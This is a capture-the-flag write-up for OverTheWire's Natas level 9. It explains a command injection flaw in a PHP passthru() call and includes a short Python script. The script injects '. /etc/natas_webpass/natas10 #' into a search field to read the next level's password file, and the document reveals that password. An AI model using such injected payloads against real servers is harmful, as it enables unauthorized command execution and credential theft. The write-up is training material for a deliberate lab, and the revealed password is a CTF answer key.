# Natas Level 9

> 🎥 **Video Walkthrough**: [Watch on YouTube](https://youtu.be/2pq7nNzJNls)

### Discovery & Logic
1. **Analysis**: The page has a search form that greps words from `dictionary.txt`.
2. **Problem**: The input is passed directly to `passthru()` without sanitization — a classic **Command Injection** vulnerability.
   ```php
   passthru("grep -i $key dictionary.txt");
   ```
3. **Solution**: Inject `. /etc/natas_webpass/natas10 #` to read the password file. The `#` comments out `dictionary.txt`.

### Source Code
[natas09.py](natas09.py)

### Commands Used

```python
import requests, re

url = "http://natas9.natas.labs.overthewire.org/"
auth = ("natas9", "[PASSWORD_NATAS9]")
data = {"needle": ". /etc/natas_webpass/natas10 #", "submit": "Search"}

r = requests.post(url, auth=auth, data=data)
print(re.findall(r'[a-zA-Z0-9]{32}', r.text)[-1])
```

### What I Learned
* **Command Injection**: User input passed directly to shell functions (`passthru`, `exec`, `system`) without sanitization allows attackers to run arbitrary commands on the server.
* **`#` as Comment**: In bash, `#` comments out everything after it — useful to neutralize trailing arguments in injected commands.
* **Never Use Raw Input in Shell Commands**: Always sanitize or whitelist input before passing it to shell execution functions.

### Password Found
<details>
  <summary>Click to reveal password</summary>
  <code>t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu</code>
</details>
